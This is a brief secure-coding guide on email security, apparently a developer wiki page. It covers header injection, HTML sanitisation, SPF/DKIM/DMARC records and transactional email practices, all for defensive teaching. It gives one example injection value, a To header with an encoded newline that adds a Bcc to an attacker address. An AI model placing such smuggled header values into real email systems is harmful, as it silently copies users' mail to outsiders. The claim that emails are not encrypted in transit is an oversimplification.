# Secure Email Handling

Email-related features (sending, receiving, parsing) introduce specific security concerns that developers often overlook.

## Email Injection

If user input is included in email headers, attackers can inject additional headers:

```
To: victim@example.com%0ABcc: attacker@evil.com
```

Always sanitize email headers. Use libraries that handle header encoding correctly.

## HTML Email Security

When rendering HTML emails:

- Strip all JavaScript (emails should never execute scripts)
- Sanitize HTML to remove dangerous tags and attributes
- Use an email-safe HTML sanitizer, not a generic one
- Don't load remote images by default (tracking pixels)

## SPF, DKIM, and DMARC

Configure all three for your sending domain:

- **SPF**: specifies which servers can send email for your domain
- **DKIM**: cryptographically signs emails to prove origin
- **DMARC**: tells receivers what to do when SPF/DKIM fail

```dns
# Example DNS records
_dmarc.example.com  TXT  "v=DMARC1; p=reject; rua=mailto:dmarc@example.com"
```

## Transactional Email Security

- Rate limit email sending per user (see [[sec-026]])
- Don't include sensitive data in emails (they're not encrypted in transit)
- Use short-lived, single-use tokens for email-based actions (password reset, verification)
- Log all email sends for audit purposes (see [[sec-014]])
